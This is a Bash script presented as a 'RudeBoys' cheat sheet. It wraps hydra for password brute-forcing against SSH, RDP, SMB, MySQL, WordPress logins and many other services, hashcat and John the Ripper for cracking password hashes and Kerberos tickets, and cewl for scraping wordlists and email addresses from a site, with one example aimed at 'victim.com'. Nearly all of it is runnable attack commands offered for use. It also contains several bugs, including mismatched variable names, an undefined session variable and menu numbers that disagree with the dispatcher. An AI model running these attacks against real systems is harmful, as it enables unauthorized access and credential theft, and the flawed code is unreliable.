#!/bin/bash
#
# Regards, the Alveare Solutions society,
#
# CHEAT SHEET

SCRIPT_NAME='RudeBoys'
VERSION='Bastards'
VERSION_NO='1.0'

function brute_force_ssh () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-root}"
    local PORT_NO=${5:-22}
    exec_msg "hydra -f -l $USER -P $WORDLIST_FILE $IPV4_ADDRS -t 4 -s $PORT_NO ssh"
    hydra -f -l "$USER" -P "$WORDLIST_FILE" "$IPV4_ADDRS" -t 4 -s $PORT_NO ssh
    return $?
}

function brute_force_mysql () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-admin}"
    local PORT_NO=${5:-3306}
    exec_msg "hydra -f -l $USER -P $WORDLIST_FILE $IPV4_ADDRS -s $PORT_NO mysql"
    hydra -f -l "$USER" -P "$WORDLIST_FILE" "$IPV4_ADDRS" -s $PORT_NO mysql
    return $?
}

function brute_force_ftp () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-root}"
    local PORT_NO=${5:-21}
    exec_msg "hydra -f -l $USER -P $WORDLIST_FILE $IPV4_ADDRS -s $PORT_NO ftp"
    hydra -f -l "$USER" -P "$WORDLIST_FILE" "$IPV4_ADDRS" -s $PORT_NO ftp
    return $?
}

function brute_force_smb () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-admin}"
    local PORT_NO=${5:-445}
    exec_msg "hydra -f -l $USER -P $WORDLIST_FILE $IPV4_ADDRS -s $PORT_NO smb"
    hydra -f -l "$USER" -P "$WORDLIST_FILE" "$IPV4_ADDRS" -s $PORT_NO smb
    return $?
}

function brute_force_web_http_form () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-admin}"
    local PORT_NO=${5:-80}
    exec_msg "hydra -l $USER -P $WORDLIST_FILE $IPV4_ADDRS -s $PORT_NO http-post-form /login.php:username=^USER^&password=^PASS^:Login Failed"
    hydra -l "$USER" -P "$WORDLIST_FILE" "$IPV4_ADDRS" -s $PORT_NO http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
    return $?
}

function brute_force_wordpress () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-admin}"
    local PORT_NO=${5:-80}
    exec_msg "hydra -f -l $USER -P $WORDLIST_FILE $IPV4_ADDRS -s $PORT_NO -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Login:Login Failed'"
    hydra -f -l "$USER" -P "$WORDLIST_FILE" "$IPV4_ADDRS" -s $PORT_NO -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Login:Login Failed'
    return $?
}

function brute_force_windows_rdp () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-administrator}"
    exec_msg "hydra -f -l $USER -P $WORDLIST_FILE rdp://${IPV4_ADDRS}"
    hydra -f -l "$USER" -P "$WORDLIST_FILE" "rdp://${IPV4_ADDRS}"
    return $?
}

function brute_force_vnc () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-root}"
    local PORT_NO=${5:-5900}
    exec_msg "hydra -l $USER -p $WORDLIST_FILE -s $PORT_NO $IPV4_ADDRS vnc"
    hydra -l "$USER" -p "$WORDLIST_FILE" -s $PORT_NO "$IPV4_ADDRS" vnc
    return $?
}

function brute_force_telnet () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-root}"
    local PORT_NO=${5:-23}
    exec_msg "hydra -l $USER -p $WORDLIST_FILE -s $PORT_NO -t 32 $IPV4_ADDRS telnet"
    hydra -l "$USER" -p "$WORDLIST_FILE" -s $PORT_NO -t 32 "$IPV4_ADDRS" telnet
    return $?
}

function brute_force_socks () {
    local IPv4_ADDRS="$2"
    local USER_FILE="$3"
    local PASS_FILE="$4"
    local PORT_NO=$5
    exec_msg "hydra -vvv -sCV --script socks-brute --script-args userdb=${USER_FILE},passdb=${PASS_FILE} -s $PORT_NO $IPv4_ADDRS"
    hydra -vvv -sCV --script socks-brute --script-args userdb=${USER_FILE},passdb=${PASS_FILE} -s $PORT_NO "$IPv4_ADDRS"
    return $?
}

function brute_force_smtp () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-root}"
    local PORT_NO=${5:-25}
    exec_msg "hydra -l $USER -p $WORDLIST_FILE -s $PORT_NO $IPv4_ADDRS smtp -V"
    hydra -l "$USER" -p "$WORDLIST_FILE" -s $PORT_NO "$IPv4_ADDRS" smtp -V
    return $?
}

function brute_force_rtsp () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-root}"
    local PORT_NO=${5:-554}
    exec_msg "hydra -l $USER -p $WORDLIST_FILE -s $PORT_NO $IPv4_ADDRS rtsp"
    hydra -l "$USER" -P "$WORDLIST_FILE" -s $PORT_NO "$IPv4_ADDRS" rtsp
    return $?
}

function brute_force_rsh () {
    local IPv4_ADDRS="$2"
    local USER_FILE="$3"
    local PORT_NO=${4:-514}
    exec_msg "hydra -L $USER_FILE -s $PORT_NO rsh://${IPv4_ADDRS} -v -V"
    hydra -L "$USER_FILE" -s $PORT_NO "rsh://${IPv4_ADDRS}" -v -V
    return $?
}

function brute_force_rlogin () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-root}"
    local PORT_NO=${5:-513}
    exec_msg "hydra -l $USER -P $WORDLIST_FILE -s $PORT_NO rlogin://${IPv4_ADDRS} -v -V"
    hydra -l "$USER" -P "$WORDLIST_FILE" -s $PORT_NO "rlogin://${IPv4_ADDRS}" -v -V
    return $?
}

function brute_force_rdp () {
    local IPv4_ADDRS="$2"
    local USER_FILE="$3"
    local PASS_FILE="$4"
    local PORT_NO=${5:-3389}
    exec_msg "hydra -V -f -L $USER_FILE -P $PASS_FILE -s $PORT_NO rdp://${IPv4_ADDRS}"
    hydra -V -f -L "$USER_FILE" -P "$PASS_FILE" -s $PORT_NO "rdp://${IPv4_ADDRS}"
    return $?
}

function brute_force_redis () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    exec_msg "hydra -P $WORDLIST_FILE $IPv4_ADDRS redis"
    hydra -P "$WORDLIST_FILE" "$IPv4_ADDRS" redis
    return $?
}

function brute_force_rexec () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-root}"
    exec_msg "hydra -l $USER -P $WORDLIST_FILE rexec://${IPv4_ADDRS} -v -V"
    hydra -l "$USER" -P "$WORDLIST_FILE" "rexec://${IPv4_ADDRS}" -v -V
    return $?
}

function brute_force_snmp () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    exec_msg "hydra -P $WORDLIST_FILE $IPv4_ADDRS snmp"
    hydra -P "$WORDLIST_FILE" "$IPv4_ADDRS" snmp
    return $?
}

function brute_force_postgresql () {
    local IPv4_ADDRS="$2"
    local USER_FILE="$3"
    local PASS_FILE="$4"
    exec_msg "hydra -L $USER_FILE -P $PASS_FILE $IPv4_ADDRS postgres"
    hydra -L "$USER_FILE" -P "$PASS_FILE" "$IPv4_ADDRS" postgres
    return $?
}

function brute_force_pop3 () {
    local IPv4_ADDRS="$2"
    local WORDLIST_FILE="$3"
    local USER="${4:-root}"
    local PORT_NO=${5:-110}
    exec_msg "hydra -S -v -l $USER -P $WORDLIST_FILE -s $PORT_NO -f $IPv4_ADDRS pop3 -V"
    hydra -S -v -l "$USER" -P "$WORDLIST_FILE" -s $PORT_NO -f "$IPv4_ADDRS" pop3 -V
    return $?
}

function hash_kerberos5_tickets () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="$3"
    local OUT_FILE="$4"
    local SESSION_NAME="${5:-crackin1}"
    exec_msg "hashcat -m 13100 -a 0 --session $SESSION $HASH_FILE $WORDLIST_FILE -o $OUT_FILE"
    hashcat -m 13100 -a 0 --session "$SESSION" "$HASH_FILE" "$WORDLIST_FILE" -o "$OUT_FILE"
    return $?
}

function hash_dictionary_attack () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="$3"
    exec_msg "hashcat -m 1000 -a 0 $HASH_FILE $WORDLIST_FILE"
    hashcat -m 1000 -a 0 "$HASH_FILE" "$WORDLIST_FILE"
    return $?
}

function hash_rule_attack () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="$3"
    local RULE_FILE="$4" # [ex]: rules/generated2.rule
    exec_msg "hashcat -m 1000 -a 0 $HASH_FILE $WORDLIST_FILE --rules=$RULE_FILE"
    hashcat -m 1000 -a 0 "$HASH_FILE" "$WORDLIST_FILE" "--rules=$RULE_FILE"
    return $?
}

function hash_targeted_brute_force () {
    local HASH_FILE="$2"
    local FORMAT_STRING="${@:3}" # [ex]: -1 ?a -2 ?u?1?d -3 ?1 -4 ?d ?1?2?3?3?3?3?3?3?4
    exec_msg "hashcat -m 1000 -a 3 $HASH_FILE $FORMAT_STRING"
    hashcat -m 1000 -a 3 "$HASH_FILE" "$FORMAT_STRING"
    return $?
}

function hash_combinator_attack () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="$3"
    local COMBINATOR_FILE="$4"
    exec_msg "hashcat -m 1000 -a 1 $HASH_FILE $WORDLIST_FILE $COMBINATOR_FILE"
    hashcat -m 1000 -a 1 "$HASH_FILE" "$WORDLIST_FILE" "$COMBINATOR_FILE"
    return $?
}

function hash_hybrid_attack_dict_mask1 () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="$3"
    exec_msg "hashcat -m 1000 -a 6 $HASH_FILE $WORDLIST_FILE ?a"
    hashcat -m 1000 -a 6 "$HASH_FILE" "$WORDLIST_FILE" ?a
    return $?
}

function hash_hybrid_attack_dict_mask2 () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="$3"
    exec_msg "hashcat -m 1000 -a 6 $HASH_FILE $WORDLIST_FILE ?a?a"
    hashcat -m 1000 -a 6 "$HASH_FILE" "$WORDLIST_FILE" ?a?a
    return $?
}

function hash_hybrid_attack_dict_mask3 () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="$3"
    exec_msg "hashcat -m 1000 -a 6 $HASH_FILE $WORDLIST_FILE ?a?a?a"
    hashcat -m 1000 -a 6 "$HASH_FILE" "$WORDLIST_FILE" ?a?a?a
    return $?
}

function hash_hybrid_attack_dict_mask4 () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="$3"
    exec_msg "hashcat -m 1000 -a 6 $HASH_FILE $WORDLIST_FILE ?a?a?a?a"
    hashcat -m 1000 -a 6 "$HASH_FILE" "$WORDLIST_FILE" ?a?a?a?a
    return $?
}

function hash_hybrid_attack_dict_1mask () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="$3"
    exec_msg "hashcat -m 1000 -a 6 $HASH_FILE ?a $WORDLIST_FILE"
    hashcat -m 1000 -a 7 "$HASH_FILE" ?a "$WORDLIST_FILE"
    return $?
}

function hash_hybrid_attack_dict_2mask () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="$3"
    exec_msg "hashcat -m 1000 -a 6 $HASH_FILE ?a?a $WORDLIST_FILE"
    hashcat -m 1000 -a 7 "$HASH_FILE" ?a?a "$WORDLIST_FILE"
    return $?
}

function hash_hybrid_attack_dict_3mask () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="$3"
    exec_msg "hashcat -m 1000 -a 6 $HASH_FILE ?a?a?a $WORDLIST_FILE"
    hashcat -m 1000 -a 7 "$HASH_FILE" ?a?a?a "$WORDLIST_FILE"
    return $?
}

function hash_hybrid_attack_dict_4mask () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="$3"
    exec_msg "hashcat -m 1000 -a 6 $HASH_FILE ?a?a?a?a $WORDLIST_FILE"
    hashcat -m 1000 -a 7 "$HASH_FILE" ?a?a?a?a "$WORDLIST_FILE"
    return $?
}

function unix_passwd_crack () {
    local HASH_FILES=( ${@:2} )
    exec_msg "john ${HASH_FILES[@]}"
    john ${HASH_FILES[@]}
    return $?
}

function check_unix_passwd_cracked () {
    local HASH_FILES=( ${@:2} )
    exec_msg "john --show ${HASH_FILES[@]}"
    john --show ${HASH_FILES[@]}
    return $?
}

function check_unix_uid0_cracked () {
    local HASH_FILES=( ${@:2} )
    exec_msg "john --show --users=0 ${HASH_FILES[@]}"
    john --show --users=0 ${HASH_FILES[@]}
    return $?
}

function check_unix_root_cracked () {
    local HASH_FILES=( ${@:2} )
    exec_msg "john --show --users=root ${HASH_FILES[@]}"
    john --show --users=root ${HASH_FILES[@]}
    return $?
}

function check_unix_privileged_cracked () {
    local HASH_FILES=( ${@:2} )
    exec_msg "john --show --groups=0,1 ${HASH_FILES[@]}"
    john --show --groups=0,1 ${HASH_FILES[@]}
    return $?
}

function check_john_the_ripper_session () {
    local SESSION_NAME="2"
    if [ -z "$SESSION_NAME" ]; then
        local CMD_ARGS="--status"
    else
        local CMD_ARGS="--status=$SESSION_NAME"
    fi
    exec_msg "john $CMD_ARGS"
    john $CMD_ARGS
    return $?
}

function unix_passwd_single_crack () {
    local HASH_FILES=( ${@:2} )
    exec_msg "john --single ${HASH_FILES[@]}"
    john --single ${HASH_FILES[@]}
    return $?
}

function unix_passwd_dictionary_crack () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="${3:-all.lst}"
    exec_msg "john --wordlist=${WORDLIST_FILE} --rules $HASH_FILE"
    john "--wordlist=${WORDLIST_FILE}" --rules "$HASH_FILE"
    return $?
}

function unix_passwd_shell_crack () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="${3:-all.lst}"
    local SHELL_CSV="${4:-sh,bash}"
    exec_msg "john --wordlist=${WORDLIST_FILE} --rules --shels=${SHELL_CSV} $HASH_FILE"
    john "--wordlist=${WORDLIST_FILE}" --rules "--shels=${SHELL_CSV}" "$HASH_FILE"
    return $?
}

function unix_passwd_uid0_crack () {
    local HASH_FILE="$2"
    local WORDLIST_FILE="${3:-all.lst}"
    exec_msg "john --wordlist=${WORDLIST_FILE} --rules --users=0 $HASH_FILE"
    john "--wordlist=${WORDLIST_FILE}" --rules --users=0 "$HASH_FILE"
    return $?
}

function unix_passwd_incremental_crack () {
    local HASH_FILES=( ${@:2} )
    exec_msg "john --incremental ${HASH_FILES[@]}"
    john --incremental ${HASH_FILES[@]}
    return $?
}

function revive_john_sessions () {
    local SESSION_NAME="$2"
    if [ -z "$SESSION_NAME" ]; then
        local CMD_ARGS="--restore"
    else
        local CMD_ARGS="--restore=${SESSION_NAME}"
    fi
    exec_msg "john $CMD_ARGS"
    john $CMD_ARGS
    return $?
}

function wordlist_from_website () {
    local OUT_FILE="$2"
    local URL="$3"
    exec_msg "cewl -w $OUT_FILE $URL"
    cewl -w "$OUT_FILE" "$URL"
    return $?
}

function wordlist_from_website_links () {
    local OUT_FILE="$2"
    local URL="$3"
    exec_msg "cewl -w $OUT_FILE -o $URL"
    cewl -w "$OUT_FILE" -o "$URL"
    return $?
}

function email_list_from_website () {
    local OUT_FILE="$2"
    local URL="$3"
    exec_msg "cewl -e -email_file $OUT_FILE -o $URL"
    cewl -e -email_file "$OUT_FILE" -o "$URL"
    return $?
}

# DISPLAY

function display_usage () {
    display_header
    cat <<EOF
 1. brute-force-ssh________________<IPv4-ADDRS> <WORDLIST-FILE> (USER|root) (PORT-NO|22)_____hydra -f -l <user> -P <wordlist-file> <ipv4-addrs> -t 4 -s <port-no> ssh
 2. brute-force-mysql______________<IPv4-ADDRS> <WORDLIST-FILE> (USER|admin) (PORT-NO|3306)__hydra -f -l <user> -P <wordlist-file> <ipv4-addrs> -s <port-no> mysql
 3. brute-force-ftp________________<IPv4-ADDRS> <WORDLIST-FILE> (USER|root) (PORT-NO|21)_____hydra -f -l <user> -P <wordlist-file> <ipv4-addrs> -s <port-no> ftp
 4. brute-force-smb________________<IPv4-ADDRS> <WORDLIST-FILE> (USER|admin) (PORT-NO|445)___hydra -f -l <user> -P <wordlist-file> <ipv4-addrs> -s <port-no> smb
 5. brute-force-web-http-form______<IPv4-ADDRS> <WORDLIST-FILE> (USER|admin) (PORT-NO|80)____hydra -l <user> -P <wordlist-file> <ipv4-addrs> -s <port-no> http-post-form "/login.php:username=^USER^&password=^PASS^:Login Failed"
 6. brute-force-wordpress__________<IPv4-ADDRS> <WORDLIST-FILE> (USER|admin) (PORT-NO|80)____hydra -f -l <user> -P <wordlist-file> <ipv4-addrs> -s <port-no> -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Login:Login Failed'
 7. brute-force-windows-rdp________<IPv4-ADDRS> <WORDLIST-FILE> (USER|administrator)_________hydra -f -l <user> -P <wordlist-file> rdp://<ipv4-addrs>
 8. brute-force-vnc________________<IPv4-ADDRS> <WORDLIST-FILE> (USER|root) (PORT|5900)______hydra -l <user> -P <wordlist-file> -s <port-no> <ipv4-addrs> vnc
 9. brute-force-telnet_____________<IPv4-ADDRS> <WORDLIST-FILE> (USER|root) (PORT|23)________hydra -l <user> -P <wordlist-file> -s <port-no> -t 32 <ipv4-addrs> telnet
10. brute-force-socks______________<IPv4-ADDRS> <USER-FILE> <PASSWD-FILE> <PORT>_____________hydra -vvv -sCV --script socks-brute --script-args userdb=<user-file>,passdb=<pass-file> -s <port-no> <ipv4-addrs>
11. brute-force-smtp_______________<IPv4-ADDRS> <WORDLIST-FILE> (USER|root) (PORT|25)________hydra -l <user> -P <wordlist-file> -s <port-no> <ipv4-addrs> smtp -V
12. brute-force-rtsp_______________<IPv4-ADDRS> <WORDLIST-FILE> (USER|root) (PORT|554)_______hydra -l <user> -P <wordlist-file> -s <port-no> <ipv4-addrs> rtsp
13. brute-force-rsh________________<IPv4-ADDRS> <USER-FILE> (PORT|514)_______________________hydra -L <user-file> -s <port-no> rsh://<ipv4-addrs> -v -V
14. brute-force-rlogin_____________<IPv4-ADDRS> <WORDLIST-FILE> (USER|root) (PORT|513)_______hydra -l <user> -P <wordlist-file> -s <port-no> rlogin://<ipv4-addrs> -v -V
15. brute-force-rdp________________<IPv4-ADDRS> <USER-FILE> <PASSWD-FILE> (PORT|3389)________hydra -V -f -L <user-file> -P <passwd-file> -s <port-no> rdp://<ipv4-addrs>
16. brute-force-redis______________<IPv4-ADDRS> <WORDLIST-FILE>______________________________hydra -P <wordlist-file> <ipv4-address> redis
17. brute-force-rexec______________<IPv4-ADDRS> <WORDLIST-FILE> (USER|root)__________________hydra -l <user> -P <wordlist-file> rexec://<ipv4-addrs> -v -V
18. brute-force-snmp_______________<IPv4-ADDRS> <WORDLIST-FILE>______________________________hydra -P <wordlist-file> <ipv4-addrs> snmp
19. brute-force-postgresql_________<IPv4-ADDRS> <USER-FILE> <PASSWD-FILE>____________________hydra -L <user-file> -P <passwd-file> <ipv4-addrs> postgres
20. brute-force-pop3_______________<IPv4-ADDRS> <WORDLIST-FILE> (USER|root) (PORT|110)_______hydra -S -v -l <user> -P <wordlist-file> -s <port-no> -f <ipv4-addrs> pop3 -V
21. hash-kerberos5-tickets_________<HASH-FILE> <WORDLIST-FILE> <OUT-FILE> (SESSION|crakin1)__hashcat -m 13100 -a 0 --session <session> <hash-file> <wordlist-file> -o <out-file>
22. hash-dictionary-attack_________<HASH-FILE> <WORDLIST-FILE>_______________________________hashcat -m 1000 -a 0 <hash-file> <wordlist-file>
23. hash-rule-attack_______________<HASH-FILE> <WORDLIST-FILE> <RULE-FILE>___________________hashcat -m 1000 -a 0 <hash-file> <wordlist-file> --rules=<rule-file>
24. hash-targeted-brute-force______<HASH-FILE> <FORMAT-STRING>_______________________________hashcat -m 1000 -a 3 <hash-file> <format-string>
25. hash-combinator-attack_________<HASH-FILE> <WORDLIST-FILE> <COMBINATOR-FILE>_____________hashcat -m 1000 -a 1 <hash-file> <wordlist-file> <combinator-file>
26. hash-hybrid-attack-dict-mask1__<HASH-FILE> <WORDLIST-FILE>_______________________________hashcat -m 1000 -a 6 <hash-file> <wordlist-file> ?a
23. hash-hybrid-attack-dict-mask2__<HASH-FILE> <WORDLIST-FILE>_______________________________hashcat -m 1000 -a 6 <hash-file> <wordlist-file> ?a?a
24. hash-hybrid-attack-dict-mask3__<HASH-FILE> <WORDLIST-FILE>_______________________________hashcat -m 1000 -a 6 <hash-file> <wordlist-file> ?a?a?a
25. hash-hybrid-attack-dict-mask4__<HASH-FILE> <WORDLIST-FILE>_______________________________hashcat -m 1000 -a 6 <hash-file> <wordlist-file> ?a?a?a?a
26. hash-hybrid-attack-dict-1mask__<HASH-FILE> <WORDLIST-FILE>_______________________________hashcat -m 1000 -a 7 <hash-file> ?a <wordlist-file>
27. hash-hybrid-attack-dict-2mask__<HASH-FILE> <WORDLIST-FILE>_______________________________hashcat -m 1000 -a 7 <hash-file> ?a?a <wordlist-file>
28. hash-hybrid-attack-dict-3mask__<HASH-FILE> <WORDLIST-FILE>_______________________________hashcat -m 1000 -a 7 <hash-file> ?a?a?a <wordlist-file>
29. hash-hybrid-attack-dict-4mask__<HASH-FILE> <WORDLIST-FILE>_______________________________hashcat -m 1000 -a 7 <hash-file> ?a?a?a?a <wordlist-file>
30. unix-passwd-crack______________<HASH-FILE1> <HASH-FILE2>...______________________________john <hash-file1> <hash-file2>...
31. check-unix-passwd-cracked______<HASH-FILE1> <HASH-FILE2>...______________________________john --show <hash-file1> <hash-file2>...
32. check-unix-uid0-cracked________<HASH-FILE1> <HASH-FILE2>...______________________________john --show --users=0 <hash-file1> <hash-file2>...
33. check-unix-root-cracked________<HASH-FILE1> <HASH-FILE2>...______________________________john --show --users=root <hash-file1> <hash-file2>...
34. check-unix-privileged-cracked__<HASH-FILE1> <HASH-FILE2>...______________________________john --show --groups=0,1 <hash-file1> <hash-file2>...
35. check-john-the-ripper-session__(SESSION-NAME|all)________________________________________john --status=<session-name>
36. unix-passwd-single-crack_______<HASH-FILE1> <HASH-FILE2>...______________________________john --single <hash-file1> <hash-file2>...
37. unix-passwd-dictionary-crack___<HASH-FILE> (WORDLIST-FILE|all.lst)_______________________john --wordlist=<wordlist-file> --rules <hash-file>
39. unix-passwd-shell-crack________<HASH-FILE> (WORDLIST-FILE|all.lst) (SHELL-CSV|sh,bash)___john --wordlist=<wordlist-file> --rules --shels=<shell-csv> <hash-file>
40. unix-passwd-uid0-crack_________<HASH-FILE> <WORDLIST-FILE|all.lst>_______________________john --wordlist=<wordlist-file> --rules --users=0 <hash-file>
41. unix-passwd-incremental-crack__<HASH-FILE1> <HASH-FILE2>...______________________________john --incremental <hash-file>
42. revive-john-sessions___________(SESSION-NAME|all)________________________________________john --restore=<session-name>
43. wordlist-from-website__________<OUT-FILE> <URL>__________________________________________cewl -w <out-file> <url>
44. wordlist-from-website-links____<OUT-FILE> <URL>__________________________________________cewl -w <out-file> -o <url>
45. email-list-from-website________<OUT-FILE> <URL>__________________________________________cewl -e -email_file <out-file> -o <url>

[ EXAMPLE ]: ./`basename $0` hash-targeted-brute-force /etc/passwd -1 ?a -2 ?u?1?d -3 ?1 -4 ?d ?1?2?3?3?3?3?3?3?4
[ EXAMPLE ]: ./`basename $0` 40 /etc/passwd ~/top-500-worst.pwd sh,bash,csh,tcsh
[ EXAMPLE ]: ./`basename $0` brute-force-ssh 192.168.0.2 ~/top-500-worst.pwd dummy-user 2222
[ EXAMPLE ]: ./`basename $0` email-list-from-website email-list.txt https://victim.com

EOF
    return $?
}

function display_header () {
    echo "
    ___________________________________________________________________________

     *            *              ${SCRIPT_NAME} Cheat Sheet           *            *
    _______________________________________________________v.${VERSION}__________
                        Regards, the Alveare Solutions society.
    "
    return $?
}

function exec_msg () {
    local MSG="$@"
    echo "[ EXEC ]: $MSG"
    return $?
}

# INIT

# TODO
function init_cheat_sheet () {
    echo "[ WARNING ]: Under construction, building..."
    local INSTRUCTION="$1"
    case "$INSTRUCTION" in
        -h|--help)
            display_usage
            ;;
        1|'brute-force-ssh')
            brute_force_ssh $@
            ;;
        2|'brute-force-mysql')
            brute_force_mysql $@
            ;;
        3|'brute-force-ftp')
            brute_force_ftp $@
            ;;
        4|'brute-force-smb')
            brute_force_smb $@
            ;;
        5|'brute-force-web-http-form')
            brute_force_web_http_form $@
            ;;
        6|'brute-force-wordpress')
            brute_force_wordpress $@
            ;;
        7|'b_ute-force-windows-rdp')
            brute_force_windows_rdp $@
            ;;
        8|'brute-force-vnc')
            brute_force_vnc $@
            ;;
        9|'brute-force-telnet')
            brute_force_telnet $@
            ;;
        10|'brute-force-socks')
            brute_force_socks $@
            ;;
        11|'brute-force-smtp')
            brute_force_smtp $@
            ;;
        12|'brute-force-rtsp')
            brute_force_rtsp $@
            ;;
        13|'brute-force-rsh')
            brute_force_rsh $@
            ;;
        14|'brute-force-rlogin')
            brute_force_rlogin $@
            ;;
        15|'brute-force-rdp')
            brute_force_rdp $@
            ;;
        16|'brute-force-redis')
            brute_force_redis $@
            ;;
        17|'brute-force-rexec')
            brute_force_rexec $@
            ;;
        18|'brute-force-snmp')
            brute_force_snmp $@
            ;;
        19|'brute-force-postgresql')
            brute_force_postgresql $@
            ;;
        20|'brute-force-pop3')
            brute_force_pop3 $@
            ;;
        21|'hash-kerberos5-tickets')
            hash_kerberos5_tickets $@
            ;;
        22|'hash-dictionary-attack')
            hash_dictionary_attack $@
            ;;
        23|'hash-rule-attack')
            hash_rule_attack $@
            ;;
        24|'hash-targeted-brute-force')
            hash_targeted_brute_force $@
            ;;
        25|'hash-combinator-attack')
            hash_combinator_attack $@
            ;;
        26|'hash-hybrid-attack-dict-mask1')
            hash_hybrid_attack_dict_mask1 $@
            ;;
        27|'hash-hybrid-attack-dict-mask2')
            hash-hybrid-attack-dict-mask2 $@
            ;;
        28|'hash-hybrid-attack-dict-mask3')
            hash_hybrid_attack_dict_mask3 $@
            ;;
        29|'hash-hybrid-attack-dict-mask4')
            hash_hybrid_attack_dict_mask4 $@
            ;;
        30|'hash-hybrid-attack-dict-1mask')
            hash_hybrid_attack_dict_1mask $@
            ;;
        31|'hash-hybrid-attack-dict-2mask')
            hash_hybrid_attack_dict_2mask $@
            ;;
        32|'hash-hybrid-attack-dict-3mask')
            hash_hybrid_attack_dict_3mask $@
            ;;
        33|'hash-hybrid-attack-dict-4mask')
            hash_hybrid_attack_dict_4mask $@
            ;;
        34|'unix-passwd-crack')
            unix_passwd_crack $@
            ;;
        35|'check-unix-passwd-cracked')
            check_unix_passwd_cracked $@
            ;;
        36|'check-unix-uid0-cracked')
            check_unix_uid0_cracked $@
            ;;
        37|'check-unix-root-cracked')
            check_unix_root_cracked $@
            ;;
        38|'check-unix-privileged-cracked')
            check_unix_privileged_cracked $@
            ;;
        39|'check-john-the-ripper-session')
            check_john_the_ripper_session $@
            ;;
        40|'unix-passwd-single-crack')
            unix_passwd_single_crack $@
            ;;
        41|'unix-passwd-dictionary-crack')
            unix_passwd_dictionary_crack $@
            ;;
        42|'unix-passwd-shell-crack')
            unix_passwd_shell_crack $@
            ;;
        43|'unix-passwd-uid0-crack')
            unix_passwd_uid0_crack $@
            ;;
        44|'unix-passwd-incremental-crack')
            unix_passwd_incremental_crack $@
            ;;
        45|'revive-john-sessions')
            revive_john_sessions $@
            ;;
        46|'wordlist-from-website')
            wordlist_from_website $@
            ;;
        47|'wordlist-from-website-links')
            wordlist_from_website_links $@
            ;;
        48|'email-list-from-website')
            email_list_from_website $@
            ;;
        *)
            echo "[ WARNING ]: Invalid instruction! ($@)"
            return 1
    esac
    return $?
}

# MISCELLANEOUS

if [ $EUID -ne 0 ]; then
    echo "[ WARNING ]: Some ($SCRIPT_NAME) instructions require elevated priviledges. Are you root?"
fi

init_cheat_sheet $@
exit $?

# CODE DUMP

